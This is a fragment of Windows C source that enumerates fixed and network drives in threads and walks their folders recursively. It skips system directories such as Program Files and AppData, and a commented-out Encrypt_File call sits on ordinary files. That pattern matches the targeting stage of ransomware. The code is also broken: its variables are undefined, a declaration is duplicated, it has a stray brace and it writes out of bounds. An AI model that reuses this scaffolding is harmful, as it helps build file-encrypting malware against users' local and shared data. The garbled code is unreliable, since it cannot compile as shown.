	#include "disk.h"
	#include <windows.h>
	#include <winsock.h>
	#include <winsock2.h>
			ListFile(char *path){
	char wildcard[MAX_PATH];
	    sprintf(wildcard, "%s\\*", folder);
	    printf("%s",folder);
	    WIN32_FIND_DATA fd;
	    HANDLE handle = FindFirstFile(wildcard, &fd);
	
	    if(handle == INVALID_HANDLE_VALUE) return;
	
	    do {
	
	        if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
	        	continue;
	
		char path[MAX_PATH];
	        sprintf(path, "%s\\%s", folder, fd.cFileName);
	
	        if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE))){
	            files_tree(path);
	
	
			//printf(path);
	        }
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE){
				//printf(path);
				//puts(path);
				//Encrypt_File(path);
				//puts(path);
			}
	    } while(FindNextFile(handle, &fd));
	
	    FindClose(handle);
	}
	
	
	
	
	
	
			}
			VOID EnumerateFolder(char *root){
				char wildcard[MAX_PATH];
				sprintf(wildcard, "%s\\*", folder);
				printf("%s",folder);
				WIN32_FIND_DATA fd;
				HANDLE handle = FindFirstFile(wildcard, &fd);
	
				if(handle == INVALID_HANDLE_VALUE) return;
	
				do {
	
					if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0 || strcmp(fd.cFileName,"Program Files")==0 || strcmp(fd.cFileName,"AppData")==0 || strcmp(fd.cFileName,"Program Files (x86)")==0 || strcmp(fd.cFileName,"Boot")==0 || strcmp(fd.cFileName,"Program Files")==0 || strcmp(fd.cFileName,"bootmgr")==0 || strcmp(fd.cFileName,"ProgramData")==0  ||  strcmp(fd.cFileName,"ProgramData")==0  || strcmp(fd.cFileName,"All Users")==0)
						continue;
	
				char path[MAX_PATH];
					sprintf(path, "%s\\%s", folder, fd.cFileName);
	
					if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE))){
					   //puts(path);
						EnumerateFolder(path);
	
					   // ListFile(path);//
	
	
					//printf(path);
					}
	
				} while(FindNextFile(handle, &fd));
	
				FindClose(handle);
	
	
	
			}
			VOID EnymerateDrivesLocal(){
			DWORD mydrives = 10240;
			char drives[3];
			drives[3]='\0';
				char lpBuffer[10240];
				DWORD test;
				int i;
				test = GetLogicalDriveStringsA(mydrives, (LPSTR)lpBuffer);
	
				if (test != 0)
				{
	
					int idx = 0;
					while ( lpBuffer[idx] != NULL )
					{
						char * driveStringBuf = &lpBuffer[idx];
	
						switch (GetDriveTypeA(driveStringBuf))
						{
						case DRIVE_UNKNOWN:
	
							break;
						case DRIVE_NO_ROOT_DIR:
	
							break;
						case DRIVE_REMOVABLE:
	
							break;
						case DRIVE_FIXED:
	
	DWORD w;
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)EnumerateFolder,driveStringBuf,0,&w);
	
							
							break;
						case DRIVE_REMOTE:
						DWORD w;
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)EnumerateFolder,driveStringBuf,0,&w);
	//unidades remotas  
							break;
						case DRIVE_CDROM:
	
							break;
						case DRIVE_RAMDISK:
	
							break;
						}
						idx += lstrlen(driveStringBuf) + 1;
					}
					
				}
				else
				{
	
				}
	
	
	
	
	
			}
